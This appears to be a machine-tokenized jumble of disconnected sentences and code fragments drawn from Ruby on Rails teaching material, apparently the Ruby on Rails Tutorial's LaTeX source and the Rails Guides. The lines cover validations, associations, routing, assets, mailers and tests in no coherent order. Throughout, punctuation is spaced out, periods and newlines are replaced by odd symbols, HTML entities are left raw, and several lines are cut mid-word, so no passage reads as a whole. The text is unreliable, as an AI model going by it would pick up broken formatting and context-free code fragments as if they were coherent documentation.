If you add an `erb` extension to a JavaScript asset , making it something such as ╼ `application ▖ js ▖ erb` , you can then use the `asset _ path` helper in your ╼ JavaScript code :
The current authentication tests check that navigation links such as ``Profile &apos; &apos; and ``Settings &apos; &apos; appear when a user is signed in .
As usual , you should check that the tests are now red :
* Allows the method to be overridden if `params &#91; : _ method &#93; ` is set ▖
Note that , apart from having \ kode { MicropostsController } in place of \ kode { UsersController } , Listing ~ \ ref { code : demo _ microposts _ controller } is \ emph { identical } to the code in Listing ~ \ ref { code : demo _ users _ controller } .
This call is ╼ responsible for isolating the controllers , models , routes and other things into ╼ their own namespace , away from similar components inside the application ▖ ╼
In Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } , we &apos;ll make \ emph { sure } of email validity by adding a separate \ emph { account activation } step to user signup .
creates the HTML needed to make a labeled text field element appropriate for setting the \ kode { name } attribute of a User model .
Following the model in Listing ~ \ ref { code : name _ presence _ test } , writing a test for \ kode { email } attribute presence is easy ( Listing ~ \ ref { code : email _ presence _ test } ) , as is the application code to get it to pass ( Listing ~ \ ref { code : validates _ presence _ of _ email } ) .
Rails needs to know ╼ this directory to generate the appropriate routes :
But it &apos;s not the final implementation ; see if you can make a guess about why not before moving on to the next section .
= &gt; { &quot; last _ name &quot; = &gt; &quot; Hartl &quot; , &quot; first _ name &quot; = &gt; &quot; Michael &quot; }
as shown in Listing ~ \ ref { code : find _ authenticate _ user } .
We will add a uniqueness validation to the Relationship model , but because it is \ emph { always } an error to create duplicate relationships , the unique index is sufficient for now .
&quot; foo \ n \ nbar &quot; ▖ indent ( 2 ) # = &gt; &quot; foo \ n \ n bar &quot;
run Rails ▖ application
create app / views / users
If your application currently depend on MultiJSON directly , you have a few options :
# # # # password _ field
setup do
Both of these models are professional-grade , with the first used by sites such as \ href { http : / / github ▖ com / } { GitHub } and \ href { http : / / bitbucket ▖ org / } { Bitbucket } , and the second used by sites such as \ href { http : / / www ▖ facebook ▖ com / } { Facebook } and \ href { http : / / twitter ▖ com / } { Twitter } .
Then they add individual \ emph { scenarios } .
To get it to \ passing , just uncomment the before filter ( Listing ~ \ ref { code : uncommented _ before _ filter } ) .
# # # Generating URLs in Action Mailer Views
You can also include all styles in the stylesheet directory using : all as the source :
If you ╼ want to change it , you can use `on : : create` to run the validation only when a ╼ new record is created or `on : : update` to run the validation only when a record ╼ is updated .
They should be used with caution .
render plain : &quot; OK &quot;
A mockup of the Home page with a form for creating microposts .
The generated application mailer .
A ▖ x = 1
This command adds all the files in the current directory apart from those that match the patterns in a special file called \ kode { ▖ gitignore } .
And I sure don &apos;t remember ever calling \ kode { StaticPagesController ▖ new } anywhere .
This allows you to treat instances of your models as URLs , and is a key advantage to using the resourceful style .
config ▖ assets ▖ compress = true
\ href { http : / / railscasts ▖ com / } { RailsCasts } by Ryan Bates : Excellent ( mostly free ) Rails screencasts
The signin functions themselves will end up crossing the traditional Model-View-Controller lines ; in particular , several signin functions will need to be available in both controllers and views .
The `last ! ` method behaves exactly like `last` , except that it will raise `ActiveRecord : : RecordNotFound` if no matching record is found .
There are several pagination methods in Rails ; we &apos;ll use one of the simplest and most robust , called \ href { http : / / wiki ▖ github ▖ com / mislav / will _ paginate / } { will \ _ paginate } .
# Use debugger
constraints subdomain : &apos; admin &apos; do
All three browsers include a built-in ``Inspect element &apos; &apos; feature available by right- ( or control- ) clicking on any part of the page .
# &lt; Client id : 221 , first _ name : &quot; Russel &quot; &gt;
The page titles are almost ( but not quite ) exactly the same .
* Rails 4 ▖ 0 deprecated `ActionController : : AbstractRequest` in favor of `ActionDispatch : : Request` .
# Returns microposts from the users being followed by the given user .
ge ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-2e6353 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection a _ flash _ test ( end ) ╼ ╼ % section login _ failure ( end ) ╼ ╼ \ section { Logging in } % ( fold ) ╼ \ label { sec : logging _ in } ╼ ╼
* `distinct`
As a result , the test in Listing ~ \ ref { code : name _ presence _ test } should now be \ passing :
routes ▖ rb # NO
I find that Cucumber is easy to read and awkward to write , while integration tests are ( for a programmer ) a little harder to read and \ emph { much } easier to write .
With models , the situation is different ; as you may recall from Section ~ \ ref { sec : a _ controller _ class } , the Rails console automatically loads the Rails environment , which includes the models .
# Person ▖ exists ? ( &apos;
* How to use nested layouts ( sub-templates ) .
A test for the ``Users &apos; &apos; link URL .
Unsafe Query Generation
( This is just a first implementation ; we &apos;ll discuss this subject again in Section ~ \ ref { sec : account _ activations _ resource } , where we &apos;ll use the preferred \ emph { method reference } convention for defining callbacks ▖ )
As constructed , only admins can destroy users through the web , because only admins can see the delete links .
We &apos;ll start with a test for the presence of a \ kode { name } attribute .
You can configure your own builder via the ` : builder` option ▖
The distinction is in where you place the foreign key ( it goes on the table for the class declaring the `belongs _ to` association ) , but you should give some thought to the actual meaning of the data as well ▖
= &gt; ActionController : : Metal
To require ╼ confirmation , make sure to add a presence check for the confirmation attribute ╼ ( we &apos;ll take a look at `presence` later on this guide ) :
Because adding Ajax to web forms is a common practice , Rails makes Ajax easy to implement .
Generating an engine
For example , the following :
* available in this directory and any sub-directories .
HTTP / 1 ▖ 1 200 OK
( Thanks to reader Katarzyna Siwek for pointing this out ▖ )
# # # # image _ path
# # # NOT Conditions
Network traffic is mostly based on the limited Western alphabet , so new character encodings , such as Unicode , emerged , to transmit characters in other languages ▖
def some _ method
It doesn &apos;t matter much what name you use , because this branch will only exist on your local computer and your personal repository on GitHub ▖
This will output the following :
flash ▖ now &#91; : alert &#93; = &quot; Your book was not found &quot;
That comment is 2 spaces away from the template :
This is ╼ especially useful if a `default _ scope` is specified in the model and should not be ╼ applied for this particular query .
* `Rails : : Rack : : Logger` notifies the logs that the request has begun ▖
bundler _ stubs /
# &lt; / object &gt;
As the example depicts , the ` : db` format generates a `BETWEEN` SQL clause ▖
# = &gt; &#91; &#91; &quot; 1 &quot; , &quot; 2 &quot; , &quot; 3 &quot; &#93; , &#91; &quot; 4 &quot; , &quot; 5 &quot; , &quot; 0 &quot; &#93; , &#91; &quot; 6 &quot; , &quot; 7 &quot; , &quot; 0 &quot; &#93; &#93;
We &apos;ll eliminate them in Section ~ \ ref { sec : professional _ grade _ deployment } ▖ )
The default error message is _ &quot; must be blank &quot; _ .
te } ╼ ╼ % subsection requiring _ the _ right _ user ( end ) ╼ ╼ \ subsection { Friendly forwarding } % ( fold ) ╼ \ label { sec : friendly _ forwarding } ╼ ╼
╼ ╼ % subsection the _ asset _ pipeline ( end ) ╼ ╼ \ subsection { Syntactically awesome stylesheets } % ( fold ) ╼ \ label { sec : sass } ╼ ╼
The method for authenticating users will be to take a submitted password , encrypt it , and compare the result to the encrypted value stored in the database .
&quot; 2013-03-11 01 : 05 : 24 &quot; , updated _ at : &quot; 2013-03-11 01 : 05 : 24 &quot; &gt;
invoke css
If you &apos;ve studied Ruby before , you might suspect that Rails is \ emph { yielding } the contents to a block , and your suspicion would be correct .
They are available for purchase through the \ href { http : / / www ▖ railstutorial ▖ org / } { Ruby on Rails Tutorial website } .
person = Person ▖ new ( name : &quot; JD &quot; )
params ▖ require ( : article ) ▖ permit ( : title , : text )
With the code in Listing ~ \ ref { code : account _ activation _ edit _ action } , you should now be able to paste in the URL from Listing ~ \ ref { code : account _ activation _ email } to activate the relevant user .
NOTE : Defined in `active _ support / core _ ext / object / duplicable ▖ rb` .
# = &gt; { : a = &gt; { : b = &gt; 1 , : c = &gt; 2 } }
( In particular , it won &apos;t work Ruby 1 ▖ 8 ▖ 7 ▖ )
# # # # `alias _ attribute`
ocusing
though an anonymous module is unreachable by definition .
The reason why we added ` @ article = Article ▖ new` in the `ArticlesController` is ╼ that otherwise ` @ article` would be `nil` in our view , and calling ╼ ` @ article ▖ errors ▖ any ? ` would throw an error .
Having created a working \ kode { user ▖ remember } method , we &apos;re now in a position to create a persistent session by storing a user &apos;s ( encrypted ) id and remember token as permanent cookies on the browser .
The ( mostly ) static pages for the sample app .
Note in particular that truncation takes into account the length of the omission string .
&lt; form accept-charset = &quot; UTF-8 &quot; action = &quot; / articles &quot; class = &quot; new _ article &quot; data-remote = &quot; true &quot; id = &quot; new _ article &quot; method = &quot; post &quot; &gt;
( Metaprogramming is one of Ruby &apos;s strongest suits , and many of the ``magic &apos; &apos; features of Rails are due to its use of Ruby metaprogramming ▖ )
t ▖ integer : part _ id
* X-Content-Type-Options
= &gt; &#91; 8 , 17 , 42 &#93;
For completeness , Listing ~ \ ref { code : gemfile _ carrierwave } also includes the \ texttt { mini \ _ magick } and \ texttt { fog } gems needed for image resizing ( Section ~ \ ref { sec : image _ resizing } ) and image upload in production ( Section ~ \ ref { sec : image _ upload _ in _ production } ) .
The \ kode { ApplicationController } class , highlighting inheritance .
COM A _ US-ER @ f ▖ b ▖ org frst ▖ lst @ foo ▖ jp a + b @ baz ▖ cn &#93;
Now re-run the test to see the effect :
He found that in this ╼ case 5-20 % of requests will not be cached ▖
# # # Updating Articles
= &gt; &#91; &quot; a &quot; , &quot; b &quot; , &quot; c &quot; &#93;
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Used for &#124;
* `secrets ▖ secret _ key _ base` is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering ▖
The ╼ default error message for this option is _ &quot; must be odd &quot; _ .
The migration to add a \ kode { password \ _ digest } column to the \ kode { users } table .
In the present case , all the navbar classes have special meaning to the Bootstrap framework , which we &apos;ll install and use in Section ~ \ ref { sec : custom _ css } .
Though it must be used with caution , the flexibility to add methods to built-in classes allows for extraordinarily natural additions to plain Ruby .
This will now render the partial in `app / views / comments / _ comment ▖ html ▖ erb` once ╼ for each comment that is in the ` @ article ▖ comments` collection ▖
Luckily , the solution is straightforward to implement : we just need to enforce uniqueness at the database level as well as at the model level .
You might also consider reading the first few chapters of \ href { http : / / www ▖ amazon ▖ com / gp / product / 1430223634 } { \ emph { Beginning Ruby } } by Peter Cooper , which starts with sample applications much smaller than a full-blown web app .
The \ kode { form \ _ for } helper is used to make forms for interacting with Active Record objects .
* After-initializers
When using one of the methods to issue HTTP requests directly , we get access to the low-level \ kode { response } object .
In this situation , you should ╼ explicitly define these assets for precompilation ▖
Here are a few things you should know to make efficient use of Active Record associations in your Rails applications :
These latter methods constitute the idiomatically correct way to make a micropost , namely , \ emph { through } its association with a user .
TIP : For more information on routing , see the &#91; Rails Routing &#93; ( routing ▖ html ) ╼ guide .
Moreover , Rails has a feature called \ emph { migrations } to allow data definitions to be written in pure Ruby , without having to learn an SQL data definition language ( DDL ) .
/ users / new
in Listing ~ \ ref { code : current _ user } .
The directory structure for a newly created Rails app ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / directory _ structure _ rails _ 4 _ 0-full ▖ png } { ( full size ) }
This enables you to add behavior to your models by ╼ transparently executing code when those events occur , like when you create a new ╼ record , update it , destroy it and so on ▖
Creating and saving a new record will send an SQL `INSERT` operation to the ╼ database ▖
The \ kode { UsersController } class , highlighting inheritance .
Even though the content will be restricted to fewer than 140 characters ( Section ~ \ ref { sec : micropost _ validations } ) and hence would fit inside the 255-character \ kode { string } type , using \ kode { text } better expresses the nature of microposts , which are more naturally thought of as blocks of text .
&lt; li &gt; ` : smtp` ( default ) , can be configured by using `config ▖ action _ mailer ▖ smtp _ settings` ▖ &lt; / li &gt;
Loading test environment
DateTime ▖ new ( 1582 , 10 , 4 , 23 ) + 1 ▖ hour
The cleanest way to do this is to reset the database with the \ kode { db : migrate : reset } Rake task :
if @ business
&lt; Location / assets / &gt;
WARNING : You should not specify this option on a `belongs _ to` association that is connected with a `has _ many` association on the other class ▖
would be referenced in a manifest like this :
Because of its importance , it &apos;s a good idea to write a test for any attribute that isn &apos;t editable , and writing such a test for the \ kode { admin } attribute is left as an exercise ( Section ~ \ ref { sec : exercises _ administrative _ users } ) .
# = &gt; Strip these tags !
If the referring URL is \ kode { nil } ( as is the case inside some tests ) , Listing ~ \ ref { code : microposts _ destroy _ action } sets the \ kode { root \ _ url } as the default using the \ kode { &#124; &#124; } operator .
$ bundle exec rake test ╼ 3 tests , 2 assertions , 0 failures , 1 errors , 0 skips
# active _ record / model _ schema ▖ rb
from Listing ~ \ ref { code : errors _ partial } to
$ bin / rails generate mailer UserMailer
In particular , we can replace the Ruby code
Use to set options like `from` or `reply _ to` for every mailer ▖
To do all this , you &apos;ll need to add the `attr _ accessor` for `author _ name` , the ╼ association for the author and the `before _ save` call into ╼ `app / models / blorgh / article ▖ rb` ▖
&#91; Used to control if the browser is allowed to only access a site over a secure connection &#93; ( http : / / en ▖ wikipedia ▖ org / wiki / HTTP _ Strict _ Transport _ Security )
This is a symbol and one of ` : plain` , ` : login` , ` : cram _ md5` .
As usual , we add the \ kode { admin } attribute with a migration , indicating the \ kode { boolean } type on the command line :
On Unix-like systems such as Linux and OS X , user and system tasks each take place within a well-defined container called a \ emph { process } .
Because microposts are short by design , the \ kode { string } type is actually big enough to contain them , but using \ kode { text } better expresses our intent , while also giving us greater flexibility should we ever wish to relax the length constraint .
# = &gt; &lt; p &gt; &lt; code &gt; : to _ param &lt; / code &gt; &lt; / p &gt;
\ section { Conclusion } % ( fold ) ╼ \ label { sec : advanced _ login _ conclusion } ╼ ╼
The following changes are meant for upgrading your application to Rails 4 ▖ 0 .
To disable it ( and allow I18n to accept * any * locale option ) add the following ╼ configuration to your application :
We &apos;ll see the technical meaning of this in Section ~ \ ref { sec : a _ class _ of _ our _ own } , but I don &apos;t think anyone ever understood objects by reading the definition in a book ; you have to build up your intuition for objects by seeing lots of examples .
By default , the \ kode { user ▖ microposts } method makes no guarantees about the order of the posts , but ( following the convention of blogs and Twitter ) we want the microposts to come out in reverse order of when they were created so that the most recent post is first
---Bob Cavezza , \ emph { Rails Tutorial } reader
Note that we &apos;ve used the \ kode { post \ _ via \ _ redirect } variant to post to the users path .
Booleans are especially useful for \ emph { control flow } :
* How to create jobs .
As a rule of thumb , extensions to `SomeClass` are available in one shot by loading `active _ support / core _ ext / some _ class` .
Permanent cookies are vulnerable to a \ emph { session hijacking } attack , so in Section ~ \ ref { sec : remember _ me } we &apos;ll have to be much more careful about the information we place on the user &apos;s browser .
&#124; &#124; 206 &#124; : partial _ content &#124;
* `active _ support ▖ deprecation _ behavior` Sets up deprecation reporting for environments , defaulting to ` : log` for development , ` : notify` for production and ` : stderr` for test ▖
If you &apos;ve found a bug in Ruby on Rails , this is the place to start ▖
There are also some optional column names that will add additional features ╼ to Active Record instances :
Possible values are ` : cookie _ store` which is the default , ` : mem _ cache _ store` , and ` : disabled` ▖
This is often factored out into its own method so it can be reused by multiple ╼ actions in the same controller , for example `create` and `update` ▖
Ruby on Rails ╼ Tutorial
Sometimes you wish to show the name of the person instead of just their email ╼ address when they receive the email ▖
In Chapter ~ \ ref { cha : log _ in _ log _ out } , we &apos;ll then use the authentication machinery from Section ~ \ ref { sec : adding _ a _ secure _ password } to let users log into the site .
Unlike that model , the present Micropost model will be fully tested , and will also have a default \ emph { ordering } and automatic \ emph { destruction } if its parent user is destroyed .
Returns an input tag of the &quot; text &quot; type tailored for accessing a specified attribute .
When you want to call a method on an object only if it is not `nil` , the simplest way to achieve it is with conditional statements , adding unnecessary clutter ▖
You can help improve the Rails guides by making them more coherent , consistent or readable , adding missing information , correcting factual errors , fixing typos , or bringing it up to date with the latest edge Rails ▖
xml ▖ target ( &quot; name &quot; = &gt; &quot; compile &quot; , &quot; option &quot; = &gt; &quot; fast &quot; )
Note the use of \ kode { validate } ( as opposed to \ kode { validates } ) to call a custom validation .
# # # # Configuring an SQLite3 Database
When reaching a natural stopping point ( such as before a commit ) , run \ kode { rspec spec / } at the command line to confirm that the entire test suite is still green .
Category ▖ includes ( articles : &#91; { comments : : guest } , : tags &#93; ) ▖ find ( 1 )
With no view ╼ available , Rails errors out .
In this section , we &apos;ll create a signup form that accepts an invalid submission and re-renders the signup page with a list of errors , as mocked up in Figure ~ \ ref { fig : signup _ failure _ mockup } .
else
Navigate to the Rails repository you just pushed to ( e ▖ g ▖ ╼ https : / / github ▖ com / your-user-name / rails ) and click on &quot; Pull Requests &quot; seen in ╼ the right panel ▖
&#124; &#124; 205 &#124; : reset _ content &#124;
The way to tell CarrierWave to associate the image with a model is to use the \ kode { mount \ _ uploader } method , which takes as arguments a symbol representing the attribute and the class name of the generated uploader :
Steer clear of reserved keywords unless you want the extra functionality ▖
* `limit`
name varchar ( 255 ) ,
On the other hand , users who try to access a page for which they would never be authorized ( such as a logged-in user trying to access a different user &apos;s edit page ) will be redirected to the root URL ( Section ~ \ ref { sec : requiring _ the _ right _ user } ) .
production :
( Failure to run this Rake task after a migration is a common source of confusion .
Upgrading from Old Versions of Rails
As seen in Figure ~ \ ref { fig : micropost _ length _ error } , Rails renders \ emph { error messages } indicating that the micropost &apos;s content is too long .
Most commonly , you might group a number of administrative controllers under an `Admin : : ` namespace ▖
The users index page with only one user .
as seen in Listing ~ \ ref { code : sign _ in _ password _ resets } and Figure ~ \ ref { fig : forgot _ password _ link } .
For every field ( also known as an attribute ) you define in your table , Active Record provides a finder method ▖
In other words , a test like
The option ` : prefix` adds a prefix to the name of the generated method ▖
As required , Listing ~ \ ref { code : generate _ users _ controller } creates a Users controller with a \ kode { new } action ( Listing ~ \ ref { code : initial _ users _ controller } ) and a stub user view ( Listing ~ \ ref { code : initial _ new _ action } ) .
# This is very inefficient when the users table has thousands of rows .
After logging in , we use \ kode { delete } to issue a \ texttt { DELETE } request to the logout path ( Table ~ \ ref { table : RESTful _ sessions } ) and verify that the user is logged out and redirected to the root URL ▖ We also check that the login link reappears and that the logout and profile links disappear .
TIP : For more information about routing , refer to &#91; Rails Routing from the Outside In &#93; ( routing ▖ html ) .
There are cases where the user time zone might be in the future compared to the system time zone , which `Date ▖ today` uses by default ▖
A user then \ kode { has \ _ many : relationships } , and has many \ kode { followed \ _ users } ( or \ kode { followers } ) \ emph { through } these relationships .
are equivalent , but otherwise you need to use \ kode { : name } ( with the colon coming first ) to denote a symbol
@ account = @ supplier ▖ account
resources : comments , only : &#91; : show , : edit , : update , : destroy &#93;
Client ▖ select ( : id ) ▖ map ( &amp; : id )
has _ and _ belongs _ to _ many : assemblies , - &gt; { group &quot; factory &quot; }
--no-test-framework
By default , all the helpers are available in the views but not in the controllers .
TIP : The retrieved record may vary depending on the database engine .
name LIKE ? &apos; , &quot; % # { query } % &quot; &#93; )
The result appears in Listing ~ \ ref { code : dependent _ destroy _ test }
distance _ of _ time _ in _ words ( Time ▖ now , Time ▖ now + 15 ▖ seconds , include _ seconds : true ) # = &gt; less than 20 seconds
# # # # `descendants`
The solution is simple : make sure that you have only one call to `render` or `redirect` in a single code path ▖
In this case , we want to submit valid information and then confirm that a user \ emph { was } created .
Rakefile
include Blorgh : : Concerns : : Models : : Article
You &apos;ll often find this association on the &quot; other side &quot; of a `belongs _ to` association ▖
This is the encrypted version of the password ( \ kode { &quot; foobar &quot; } ) used to initialize the user object .
# &lt; User id : 2 , name : &quot; A Nother &quot; , ╼ email : &quot; another @ example ▖ org &quot; , created _ at :
I find that having the data model visible in the model files helps remind me which attributes the model has , but future code listings will omit the annotations for brevity .
The chosen value may not always be the same given the same hash :
The inheritance hierarchy for the \ kode { String } class .
When Rails looks for a view to render , it will first look in the `app / views` ╼ directory of the application ▖
We can arrange this with the \ kode { resources } line shown in Listing ~ \ ref { code : account _ activations _ route } .
Rails 4 ▖ 1 introduces ` : plain` , ` : html` , and ` : body` options to `render` ▖
belongs _ to : customer
Tests for some ``following &apos; &apos; utility methods ▖
invoke jbuilder _ scaffold _ controller
# # # # Adding a Middleware
If you &apos;d like to use your own SQL to find records in a table you can use `find _ by _ sql` ▖
Adding environment loading to the \ kode { Spork ▖ prefork } block .
It allows you to write less ╼ code while accomplishing more than many other languages and frameworks .
* `update _ counters`
This practice will prevent conflicts with the main tutorial .
We start with the inheritance structure for models .
{ nil = &gt; nil , 1 = &gt; 1 , nested : { a : 3 , 5 = &gt; 5 } } ▖ deep _ transform _ keys { &#124; key &#124; key ▖ to _ s ▖ upcase }
Rather than repeating the main layout and editing it , you can accomplish this by using nested layouts ( sometimes called sub-templates ) ▖
The Home page with an added footer .
GitHub ╼ Issues are not a particularly good venue for the sometimes long and involved ╼ discussions new features require .
* `asset-url` with two arguments is deprecated ▖
&#124; POST &#124; / kategorien &#124; categories # create &#124; categories _ path &#124;
* ` : maximum` - The attribute cannot have more than the specified length .
# active _ support / dependencies ▖ rb
Fixing these issues will require some trickery , but the result will be a far more powerful test suite .
&#124; &#124; 102 &#124; : processing &#124;
For example : `asset-url ( &quot; rails ▖ png &quot; , image ) ` becomes `asset-url ( &quot; rails ▖ png &quot; ) ` .
&#124; --------- &#124; -------------- &#124; ----------------- &#124; --------------------------------------------- &#124;
Or ordering by multiple fields :
&lt; % = image _ tag &quot; header ▖ png &quot; % &gt;
The ╼ JSON gem APIs will function as normal , but they will not have access to any ╼ Rails-specific features ▖
PATCH
$ bundle exec rake test : sqlite3
array # = &gt; &#91; &apos; string &apos; &#93;
BigDecimal ▖ new ( 5 ▖ 00 , 6 ) ▖ to _ formatted _ s ( &quot; e &quot; ) # = &gt; &quot; 0 ▖ 5E1 &quot;
def destroy
Similarly , the second assignment is \ texttt { @ foo &#124; &#124; &quot; baz &quot; } , i ▖ e ▖ , \ texttt { &quot; bar &quot; &#124; &#124; &quot; baz &quot; } , which also evaluates to \ texttt { &quot; bar &quot; } .
category ▖ articles ▖ published # = &gt; &#91; published articles belonging to this category &#93;
For example , setting `I18n ▖ locale = : de` and creating `public / 500 ▖ de ▖ html` and `public / 404 ▖ de ▖ html` would allow you to have localized rescue pages .
Fielding , Roy Thomas .
* How to quickly generate the starting pieces of a Rails application .
Note that we &apos;ve also taken this opportunity to arrange for the \ texttt { sqlite3 } gem to be included only in a development or test environment ( Section ~ \ ref { sec : rails _ environments } ) , which prevents potential conflicts with the database used by Heroku ( Section ~ \ ref { sec : deploying } ) .
Since we &apos;ll be making a controller to handle static pages , we &apos;ll call it the Static Pages controller , designated by the \ href { https : / / en ▖ wikipedia ▖ org / wiki / CamelCase } { CamelCase } name \ kode { StaticPages } .
# # # sprockets-rails
This is especially useful in production since you should not commit secrets like your database password into your source control ( such as Git ) .
However , you might want to consider moving it to a template file if the markup ╼ is complex .
In Listing ~ \ ref { code : email _ downcase } , we could have written the assignment as
As in Section ~ \ ref { sec : requiring _ logged _ in _ users } and Section ~ \ ref { sec : requiring _ the _ right _ user } , we &apos;ll enforce access control using a before filter , this time to restrict access to the \ kode { destroy } action to admins .
static-pages
# # # Mutator methods called on Relation
The auxiliary file is written in a standard directory for temporary files , but you can pass a directory of your choice as second argument .
In fact , this is very close to the syntax that Rails uses to declare this ╼ association ▖
╼ $ subl .
The method understands qualified table names :
in Listing ~ \ ref { code : generate _ micropost _ model } .
class Assembly &lt; ActiveRecord : : Base
Here we &apos;ve tested the appearance of the signout link to verify that the user was successfully signed in after signing up .
delivery _ options = { user _ name : company ▖ smtp _ user ,
&quot; Backoffice : : UsersController &quot; ▖ deconstantize # = &gt; &quot; Backoffice &quot;
&quot; 2010-07-27 23 : 37 : 00 &quot; ▖ to _ time # = &gt; Tue Jul 27 23 : 37 : 00 UTC 2010
* `decrement _ counter`
The Home page after creating a new micropost .
Only available if `config ▖ action _ controller ▖ session _ store` is set to a value .
As shown in Figure ~ \ ref { fig : cloud9 _ two _ spaces } , you can do this by clicking the gear icon in the upper right and then selecting ``Code Editor ( Ace ) &apos; &apos; to edit the ``Soft Tabs &apos; &apos; setting .
To get started , let &apos;s start work on an \ kode { updating-users } topic branch :
This is used by the Rails ╼ helper methods to avoid handing the mapping requests back to Sprockets ▖
By passing the optional parameters \ kode { name : string } and \ kode { email : string } , we tell Rails about the two attributes we want , along with which types those attributes should be ( in this case , \ kode { string } ) .
# = &gt; # &lt; Client id : 1 , first _ name : &quot; Andy &quot; , orders _ count : 0 , locked : true , created _ at : &quot; 2011-08-30 06 : 09 : 27 &quot; , updated _ at : &quot; 2011-08-30 06 : 09 : 27 &quot; &gt;
Rails &apos; old strategy was to append a date-based query string to every asset linked ╼ with a built-in helper ▖
Heroku makes deploying Rails applications ridiculously easy---as long as your source code is under version control with Git .
By filling in the missing elements in Listing ~ \ ref { code : login _ create _ user _ instance } and Listing ~ \ ref { code : improved _ remember _ me _ test } ( indicated with question marks ~ \ kode { ? } \ and \ kode { FILL \ _ IN } ) , complete this improved test of the ``remember me &apos; &apos; checkbox .
SELECT articles .
has _ one : account
If you have an empty `config / database ▖ yml` file but your `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` is present , then Rails will connect to the database via your environment variable :
\ begin { equation } ╼ \ label { eq : time _ comparison } ╼ t _ r &lt; t _ e .
If any of the validations fail , the `errors` collection will be filled again .
In this case , we &apos;re looking for
Of course , we don &apos;t need the default Rails page in the long run , but it &apos;s nice to see it working for now .
Especially for XSS , it is important to do _ whitelist input filtering instead of blacklist _ ▖
{ &quot; development &quot; = &gt; { &quot; adapter &quot; = &gt; &quot; postgresql &quot; , &quot; host &quot; = &gt; &quot; localhost &quot; , &quot; database &quot; = &gt; &quot; my _ database &quot; } }
# # # What is Fingerprinting and Why Should I Care ?
Because test suites can become quite slow even for relatively small projects , being able to run one test ( or a small group of tests ) at a time can be a huge win .
&lt; / ul &gt; See &#91; API docs &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionMailer / Base ▖ html ) for more info .
If you read much about Ruby on Rails web development , you &apos;ll see a lot of references to ``REST &apos; &apos; , which is an acronym for REpresentational State Transfer .
@ assembly _ ids = @ part ▖ assembly _ ids
If you &apos;d like feedback on an idea for a feature before doing the work for make ╼ a patch , please send an email to the &#91; rails-core mailing ╼ list &#93; ( https : / / groups ▖ google ▖ com / forum / ? fromgroups # ! forum / rubyonrails-core ) ▖ You ╼ might get no response , which means that everyone is indifferent ▖
Let &apos;s start exploring strings with the console , this time started with \ kode { rails ~ c } , which is a shortcut for \ kode { rails console } :
( This is because the HTTP standard technically requires a full URL after redirects , though in most browsers it will work either way ▖ )
has _ and _ belongs _ to _ many Association Diagram &#93; ( images / habtm ▖ png )
As we saw briefly before in the Chapter ~ \ ref { cha : a _ toy _ app } exercises , the way to validate the presence of the name attribute is to use the \ kode { validates } method with argument \ kode { presence : true } , as shown in Listing ~ \ ref { code : validates _ presence _ of _ name } .
( This is a somewhat advanced Ruby topic , so don &apos;t worry if it doesn &apos;t make sense right away ▖ )
For example , given
This is an unlikely combination of events , and with the application as presently constructed it isn &apos;t necessary , but because it &apos;s security-related I include it for completeness .
invoke test _ unit
If you &apos;re used to using raw SQL to find database records , then you will generally find that there are better ways to carry out the same operations in Rails ▖
now ▖ all _ week ( : sunday )
# # # # Configuring a MySQL Database
Examples :
It &apos;s not important at this point to understand the syntax in Listing ~ \ ref { code : default _ controller _ test } in detail , but we can see that there are two tests , one for each controller action we included on the command line in Listing ~ \ ref { code : generating _ pages } .
The sample application site layout ▖
This means we can use
class Product &lt; ActiveRecord : : Base
By replacing the question marks in Listing ~ \ ref { code : string _ shuffle } with the appropriate methods , combine \ kode { split } , \ kode { shuffle } , and \ kode { join } to write a function that shuffles the letters in a given string .
╼ ╼ This is the first application for the ╼ &#91; * Ruby on Rails Tutorial * &#93; ( http : / / www ▖ railstutorial ▖ org / ) ╼ by &#91; Michael Hartl &#93; ( http : / / www ▖ michaelhartl ▖ com / ) .
We then verify that the \ kode { create } and \ kode { destroy } actions do the correct things when hit with an Ajax request .
ide the IDE itself ▖ ) ╼ ╼ \ subsection { A user tour } % ( fold ) ╼ \ label { sec : a _ user _ tour } ╼ ╼
Wildcard segments can occur anywhere in a route ▖
&#124; vendor / &#124; A place for all third-party code ▖
Moreover , this usage matches up with the commit messages generated by Git commands themselves .
The chain is returned in an array , from bottom to top :
class Employee &lt; ActiveRecord : : Base
TIP ▖ Please squash your commits into a single commit when appropriate ▖
In that case Rails must reraise the exception ▖
This is part of what makes them confusing ▖ )
It defaults to ` &apos; -&apos;` , which turns on trimming of tail spaces and newline when using ` &lt; % = - % &gt; ` or ` &lt; % = = % &gt; ` ▖
We will identify privileged administrative users with a boolean \ kode { admin } attribute in the User model , which will lead automatically to an \ kode { admin ? } \ boolean method to test for admin status .
There are six asset tag helpers available in Rails :
A mockup of our best guess at the final profile page .
# Give add _ invoices an array of 1000 invoices at a time
Intercepting Emails
Two of these symbols are special : ` : controller` maps to the name of a controller in your application , and ` : action` maps to the name of an action within that controller ▖
has _ many : orders , dependent : : destroy
We &apos;ll begin by reviewing the route for the Home page ( defined in Section ~ \ ref { sec : setting _ the _ root _ route } ) , which is a special case , and then define a set of routes for the remaining static pages .
in Listing ~ \ ref { code : user _ show _ action } finds the user with id ~ \ texttt { 1 } .
&lt; strong &gt; Commenter : &lt; / strong &gt;
With hash conditions , you pass in a hash with keys of the fields you want conditionalised and the values of how you want to conditionalise them :
This even applies to parameters that you do not specify as dynamic segments ▖
Converting Listing ~ \ ref { code : footer _ css } by hand is a good exercise , and you should verify that the CSS still works properly after the conversion .
in Listing ~ \ ref { code : custom _ about _ page } .
--------------------------------------------
With a book index , on the other hand , you can just look up ``foobar &apos; &apos; in the index to see all the pages containing ``foobar &apos; &apos; .
# # # Configuring Active Record
Luckily , Rails includes a default \ kode { alt } attribute ; if you don &apos;t specify the attribute in the call to \ kode { image \ _ tag } , Rails just uses the image filename ( minus extension ) .
In this case , ``a user visits the signin page &apos; &apos; is implemented by
In contrast to previous model validations , file size validation doesn &apos;t correspond to a built-in Rails validator .
This is because , in the case of a \ kode { : followers } attribute , Rails will singularize ``followers &apos; &apos; and automatically look for the foreign key \ kode { follower \ _ id } in this case .
